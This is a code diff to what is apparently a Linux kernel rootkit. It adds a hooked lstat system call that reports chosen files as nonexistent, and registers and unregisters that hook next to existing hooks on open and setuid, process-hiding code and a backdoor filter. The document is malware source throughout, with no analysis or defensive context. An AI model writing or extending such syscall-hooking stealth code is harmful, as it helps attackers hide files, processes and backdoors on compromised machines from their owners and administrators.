@@ -87,6 +87,22 @@ asmlinkage long hacked_open(const char __user *filename, int flags, umode_t mode
     return ret;
 }
 
+asmlinkage long hacked_lstat(const char __user *filename,
+            struct __old_kernel_stat __user *statbuf)
+{
+    long ret;
+
+    ret = (*orig_lstat)(filename, statbuf);
+
+    if (should_hide_file(filename))
+    {
+        ret = -ENOENT;
+    } 
+
+    return ret;
+    
+}
+
 // Will hide any files from within the dirp and return the new length of dirp
 long handle_ls(struct linux_dirent *dirp, long length)
 {
@@ -455,6 +471,8 @@ static int __init initModule(void)
 
     HOOK_SYSCALL(sys_call_table, orig_open, hacked_open, __NR_open);
 
+    HOOK_SYSCALL(sys_call_table, orig_lstat, hacked_lstat, __NR_lstat);
+
     init_hide_processes();
 
     init_filter_backdoor();
@@ -473,6 +491,8 @@ static void __exit exitModule(void)
     UNHOOK_SYSCALL(sys_call_table, orig_setuid, __NR_setuid);
 
     UNHOOK_SYSCALL(sys_call_table, orig_open, __NR_open);
+
+    UNHOOK_SYSCALL(sys_call_table, orig_lstat, __NR_lstat);
 
     exit_hide_processes();
 
